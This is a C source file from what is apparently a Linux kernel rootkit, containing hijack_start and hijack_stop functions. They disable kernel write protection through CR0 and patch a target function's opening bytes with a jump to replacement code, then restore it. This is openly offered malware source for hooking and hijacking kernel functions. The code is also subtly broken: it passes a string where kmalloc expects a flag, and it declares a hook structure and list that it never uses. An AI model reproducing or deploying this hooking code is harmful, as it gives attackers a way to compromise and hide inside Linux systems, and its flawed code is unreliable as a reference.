#include <linux/slab.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>
#include "rootkit.h"

#define HIJACK_SIZE 12


struct sym_hook {
    void *addr;
    unsigned char o_code[HIJACK_SIZE];
    unsigned char n_code[HIJACK_SIZE];
    struct list_head list;
};

LIST_HEAD(hooked_syms);


void hijack_start ( void *target, void *new, unsigned char** o_code)
{
    struct sym_hook *sa;
    unsigned char n_code[HIJACK_SIZE];

    *o_code = kmalloc(HIJACK_SIZE, "GFP_KERNEL");

    unsigned long o_cr0;

    // mov rax, $addr; jmp rax
    memcpy(n_code, "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0", HIJACK_SIZE);
    *(unsigned long *)&n_code[2] = (unsigned long)new;

    printk("Hooking function 0x%p with 0x%p\n", target, new);

    memcpy(*o_code, target, HIJACK_SIZE);

    // disable_write_protection();
    write_cr0(read_cr0() & (~ 0x10000));
    memcpy(target, n_code, HIJACK_SIZE);
    write_cr0(read_cr0() | 0x10000);
    // enable_write_protection();

    printk("Old core pointer address - %p \n", *o_code);
}

void hijack_stop(void *target, unsigned char* o_code){

    write_cr0(read_cr0() & (~ 0x10000));
    memcpy(target, o_code, HIJACK_SIZE);
    write_cr0(read_cr0() | 0x10000);

}